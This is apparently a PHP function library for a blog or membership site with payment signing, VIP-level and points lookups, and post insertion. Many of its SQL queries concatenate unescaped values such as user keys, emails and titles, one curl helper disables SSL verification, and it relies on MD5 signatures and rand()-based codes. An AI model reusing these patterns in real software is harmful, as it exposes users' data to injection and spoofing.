	curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,2);
	curl_setopt($curl,CURLOPT_CAINFO,$cacert_url);
	$responseText=curl_exec($curl);
	curl_close($curl);
	return $responseText;
}
function charsetEncode($input,$_output_charset,$_input_charset)
{
	$output='';
	if (!isset($_output_charset)) 
	{
		$_output_charset=$_input_charset;
	}
	if (($_input_charset==$_output_charset || $input==NULL)) 
	{
		$output=$input;
	}
	else 
	{
		if (function_exists('mb_convert_encoding')) 
		{
			$output=mb_convert_encoding($input,$_output_charset,$_input_charset);
		}
		else 
		{
			if (function_exists('iconv')) 
			{
				$output=iconv($_input_charset,$_output_charset,$input);
			}
			else 
			{
				exit('sorry, you have no libs support for charset change.');
			}
		}
	}
	return $output;
}
function charsetDecode($input,$_input_charset,$_output_charset)
{
	$output='';
	if (!isset($_input_charset)) 
	{
		$_input_charset=$_input_charset;
	}
	if (($_input_charset==$_output_charset || $input==NULL)) 
	{
		$output=$input;
	}
	else 
	{
		if (function_exists('mb_convert_encoding')) 
		{
			$output=mb_convert_encoding($input,$_output_charset,$_input_charset);
		}
		else 
		{
			if (function_exists('iconv')) 
			{
				$output=iconv($_input_charset,$_output_charset,$input);
			}
			else 
			{
				exit('sorry, you have no libs support for charset changes.');
			}
		}
	}
	return $output;
}
function md5Sign($prestr,$key)
{
	$prestr=$prestr.$key;
	return md5($prestr);
}
function md5Verify($prestr,$sign,$key)
{
	$prestr=$prestr.$key;
	$mysgin=md5($prestr);
	if ($mysgin==$sign) 
	{
		return true;
	}
	return false;
}
function buildRequestMysign($para_sort)
{
	global $Tconfig;
	$prestr=createLinkstring($para_sort);
	$mysign=md5Sign($prestr,$Tconfig['sh_appkey']);
	return $mysign;
}
function buildRequestPara($para_temp)
{
	$para_filter=paraFilter($para_temp);
	$para_sort=argSort($para_filter);
	$mysign=buildRequestMysign($para_sort);
	$para_sort['sign']=$mysign;
	$para_sort['sign_type']=strtoupper(trim(strtoupper('MD5')));
	return $para_sort;
}
function buildRequestParaToString($para_temp)
{
	$para=buildRequestPara($para_temp);
	$request_data=createLinkstringUrlencode($para);
	return $request_data;
}
function buildRequestForm($para_temp,$method='POST',$button_name='正在跳转')
{
	$para=buildRequestPara($para_temp);
	$sHtml='<form id=\'alipaysubmit\' name=\'alipaysubmit\' action=\'http://www.yiwane.com/submit.php?_input_charset='.strtolower('utf-8').'\' method=\''.$method.'\'>';
	while (list($key,$val)=each($para)) 
	{
		$sHtml .='<input type=\'hidden\' name=\''.$key.'\' value=\''.$val.'\'/>';
	}
	$sHtml=$sHtml.'<input type=\'submit\' value=\''.$button_name.'\'></form>';
	$sHtml=$sHtml.'<script>document.forms[\'alipaysubmit\'].submit();</script>';
	return $sHtml;
}
function getSignVeryfy($para_temp,$sign)
{
	global $Tconfig;
	$para_filter=paraFilter($para_temp);
	$para_sort=argSort($para_filter);
	$prestr=createLinkstring($para_sort);
	$isSgin=false;
	$isSgin=md5Verify($prestr,$sign,$Tconfig['sh_appkey']);
	return $isSgin;
}
function curls($url,$timeout='5')
{
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_URL,$url);
	curl_setopt($ch,CURLOPT_TIMEOUT,$timeout);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
	curl_setopt($ch,CURLOPT_HEADER,0);
	$info=curl_exec($ch);
	curl_close($ch);
	return $info;
}
function isKeyExist($key)
{
	$DB=Database::getInstance();
	$data=$DB->once_fetch_array('SELECT * FROM '.DB_PREFIX.'user_key WHERE `key`=\''.$key.'\'');
	if (!$data) 
	{
	}
	else 
	{
		if ($data) 
		{
			return $data;
		}
	}
	return false;
}
function isUidExist($uid)
{
	$DB=Database::getInstance();
	$data=$DB->once_fetch_array('SELECT COUNT(*) AS total FROM '.DB_PREFIX.'user WHERE uid=\''.$uid.'\'');
	if ($data['total']>0) 
	{
		return true;
	}
	return false;
}
function isUserExist($uid)
{
	$DB=Database::getInstance();
	$data=$DB->once_fetch_array('SELECT COUNT(*) AS total FROM '.DB_PREFIX.'user WHERE username=\''.$uid.'\'');
	if ($data['total']>0) 
	{
		return true;
	}
	return false;
}
function isemailExist($email)
{
	$DB=Database::getInstance();
	$data=$DB->once_fetch_array('SELECT COUNT(*) AS total FROM '.DB_PREFIX.'user WHERE email=\''.$email.'\'');
	if ($data['total']>0) 
	{
		return true;
	}
	return false;
}
function get_uid_vip($uid=UID)
{
	$DB=Database::getInstance();
	$row=$DB->once_fetch_array('select * from '.DB_PREFIX.'user where uid='.$uid);
	if ($row) 
	{
		if ($row['vip']<=time()) 
		{
			return -1;
		}
		return $row['vip'];
	}
	return false;
}
function get_uid_money($uid=UID)
{
	$DB=Database::getInstance();
	$row=$DB->once_fetch_array('select * from '.DB_PREFIX.'user where uid='.$uid);
	if ($row['Integral']) 
	{
		return $row['Integral'];
	}
	return 0;
}
function get_uid_level($uid=UID)
{
	$DB=Database::getInstance();
	$row=$DB->once_fetch_array('select * from '.DB_PREFIX.'user where uid='.$uid);
	if ($row) 
	{
		return $row['level'];
	}
	return false;
}
function add_vip_log($log,$uid)
{
	if ($log) 
	{
		$User_Model=new User_Model();
		$auser=$User_Model->getOneUser(UID);
		$buser=$User_Model->getOneUser($uid);
		$log=$auser['username'].'('.UID.') 为 '.$buser['username'].'('.$uid.')'.$log;
		$DB=Database::getInstance();
		$userData=$DB->query('INSERT INTO  '.DB_PREFIX.'user_log (`log` ,`time`)VALUES (\''.$log.'\',\''.time().'\')');
		return true;
	}
	return false;
}
function get_time_type($time)
{
	if ($time==1) 
	{
		$str=array('time'=>60*60*24*31,'name'=>'一个月');
	}
	if ($time==2) 
	{
		$str=array('time'=>60*60*24*31*3,'name'=>'三个月');
	}
	if ($time==3) 
	{
		$str=array('time'=>60*60*24*31*12,'name'=>'一年');
	}
	return $str;
}
function get_level_type($type)
{
	if ($type==1) 
	{
		$str=array('level'=>1,'name'=>'白银');
	}
	if ($type==2) 
	{
		$str=array('level'=>2,'name'=>'黄金');
	}
	if ($type==3) 
	{
		$str=array('level'=>3,'name'=>'钻石');
	}
	return $str;
}
function get_random_code($length=32,$mode=5)
{
	switch($mode)
	{
		case 1:$str=1234567890;
		break;
		case 2:$str='abcdefghijklmnopqrstuvwxyz';
		break;
		case 3:$str='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
		break;
		case 4:$str='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
		break;
		case 5:$str='ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
		break;
		case 6:$str='abcdefghijklmnopqrstuvwxyz1234567890';
		break;
	}
	$str='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
	$result='';
	$l=strlen($str);
	$i=0;
	while ($i<$length) 
	{
		$num=rand(0,$l-1);
		$result .=$str[$num];
		$i=$i+1;
	}
	return $result;
}
function em_is_mobile()
{
	$is_mobile='';
	if (empty($_SERVER['HTTP_USER_AGENT'])) 
	{
		$is_mobile=false;
	}
	else 
	{
		if ((!strpos($_SERVER['HTTP_USER_AGENT'],'Mobile')===false || !strpos($_SERVER['HTTP_USER_AGENT'],'Android')===false) || !strpos($_SERVER['HTTP_USER_AGENT'],'Silk/')===false || !strpos($_SERVER['HTTP_USER_AGENT'],'Kindle')===false || !strpos($_SERVER['HTTP_USER_AGENT'],'BlackBerry')===false || !strpos($_SERVER['HTTP_USER_AGENT'],'Opera Mini')===false || !strpos($_SERVER['HTTP_USER_AGENT'],'Opera Mobi')===false) 
		{
			$is_mobile=true;
		}
		else 
		{
			$is_mobile=false;
		}
	}
	return $is_mobile;
}
function post_addlog($logData)
{
	$db=Database::getInstance();
	$kItem=array();
	$dItem=array();
	foreach($logData as $key=>$data)
	{
		$kItem[]=$key;
		$dItem[]=$data;
	}
	$field=implode(',',$kItem);
	$values='\''.implode('\',\'',$dItem).'\'';
	$db->query('INSERT INTO '.DB_PREFIX.'blog ('.$field.') VALUES ('.$values.')');
	$logid=$db->insert_id();
	return $logid;
}
function post_title($title)
{
	$db=Database::getInstance();
	$row=$db->once_fetch_array('SELECT * FROM  `'.DB_NAME.'`.`'.DB_PREFIX.'blog` WHERE `title` = \''.$title.'\'');
	if ($row) 
	{
		return 1;
	}
	return '';
}
?>